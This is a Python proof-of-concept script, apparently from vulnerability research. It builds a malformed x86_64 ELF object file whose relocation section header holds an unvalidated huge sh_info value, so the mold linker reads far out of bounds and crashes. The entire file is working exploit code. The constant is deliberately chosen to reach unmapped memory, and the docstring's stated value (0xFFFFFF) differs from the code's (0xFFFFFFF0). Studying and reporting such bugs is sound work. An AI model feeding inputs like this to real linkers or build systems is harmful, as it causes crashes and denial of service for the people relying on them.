#!/usr/bin/env python3
"""Writes a minimal x86_64 ET_REL ELF object file with a real .rela.text section whose sh_info
(the index of the section the relocations apply to) is a huge, unvalidated value (0xFFFFFF).

src/input-files.cc, ObjectFile<E>::initialize_sections(), "Attach relocation sections to their
target sections" loop:

    for (i64 i = 0; i < this->elf_sections.size(); i++) {
      const ElfShdr<E> &shdr = this->elf_sections[i];
      if (shdr.sh_type == (E::is_rela ? SHT_RELA : SHT_REL) || shdr.sh_type == SHT_CREL) {
        if (InputSection<E> *target = sections[shdr.sh_info]) {   // <-- no bounds check
          ...

`sections` is an `InputSectionTable<E>` backed by `std::vector<u32> indices` sized to
`elf_sections.size()` (a handful of entries for this minimal object). `shdr.sh_info` is copied
straight from the file with no range check against that size anywhere on this path, so
`indices[idx]` (src/mold.h, InputSectionTable<E>::operator[]) reads far out of bounds of a small
heap-allocated std::vector.
"""
import struct
import sys

SHT_PROGBITS = 1
SHT_SYMTAB = 2
SHT_STRTAB = 3
SHT_RELA = 4
SHF_ALLOC = 2
SHF_EXECINSTR = 4

MALICIOUS_SH_INFO = 0xFFFFFFF0  # far past this object's ~6 sections; large enough to jump
                                 # multiple GB past the tiny `indices` heap allocation, into
                                 # genuinely unmapped memory (see 004's mmap-page-boundary lesson
                                 # in projects/mold.md - a merely-KB-scale overread often lands on
                                 # still-mapped heap and reads silently as zero)


def shdr(name, type_, flags, addr, offset, size, link, info, addralign, entsize):
    return struct.pack("<IIQQQQIIQQ", name, type_, flags, addr, offset, size, link, info,
                        addralign, entsize)


def build() -> bytes:
    names = b"\x00"

    def addname(s):
        nonlocal names
        off = len(names)
        names += s.encode() + b"\x00"
        return off

    n_text = addname(".text")
    n_symtab = addname(".symtab")
    n_strtab = addname(".strtab")
    n_rela = addname(".rela.text")
    n_shstrtab = addname(".shstrtab")

    EHDR_SIZE = 64
    SHDR_SIZE = 64

    text_data = b"\x90\x90\x90\x90"  # 4 NOPs
    strtab_data = b"\x00"            # just the empty string
    sym_null = struct.pack("<IBBHQQ", 0, 0, 0, 0, 0, 0)  # one null symbol entry (24 bytes)

    off = EHDR_SIZE
    off_text = off
    off += len(text_data)
    off_symtab = off
    off += len(sym_null)
    off_strtab = off
    off += len(strtab_data)
    # .rela.text has 0 entries (sh_size=0) - the crash happens from reading its own sh_info
    # field, no relocation entries are ever needed.
    off_rela = off
    off_shstrtab = off
    off += len(names)
    pad = (-off) % 8
    off += pad
    off_shdrs = off

    sh_null    = shdr(0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
    sh_text    = shdr(n_text, SHT_PROGBITS, SHF_ALLOC | SHF_EXECINSTR, 0,
                       off_text, len(text_data), 0, 0, 1, 0)
    sh_symtab  = shdr(n_symtab, SHT_SYMTAB, 0, 0, off_symtab, len(sym_null), 3, 1, 8, 24)
    sh_strtab  = shdr(n_strtab, SHT_STRTAB, 0, 0, off_strtab, len(strtab_data), 0, 0, 1, 0)
    sh_rela    = shdr(n_rela, SHT_RELA, 0, 0, off_rela, 0, 2, MALICIOUS_SH_INFO, 8, 24)
    sh_shstrtab = shdr(n_shstrtab, SHT_STRTAB, 0, 0, off_shstrtab, len(names), 0, 0, 1, 0)

    e_ident = bytes([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0]) + b"\x00" * 8
    ehdr = e_ident + struct.pack(
        "<HHIQQQIHHHHHH",
        1,          # e_type = ET_REL
        62,         # e_machine = EM_X86_64
        1,          # e_version
        0,          # e_entry
        0,          # e_phoff
        off_shdrs,  # e_shoff
        0,          # e_flags
        EHDR_SIZE,
        0, 0,       # e_phentsize, e_phnum
        SHDR_SIZE,
        6,          # e_shnum
        5,          # e_shstrndx
    )
    assert len(ehdr) == EHDR_SIZE

    return (ehdr + text_data + sym_null + strtab_data + names + b"\x00" * pad +
            sh_null + sh_text + sh_symtab + sh_strtab + sh_rela + sh_shstrtab)


def main() -> None:
    out_path = sys.argv[1] if len(sys.argv) > 1 else "evil.o"
    with open(out_path, "wb") as f:
        f.write(build())
    print(f"wrote {out_path}")


if __name__ == "__main__":
    main()
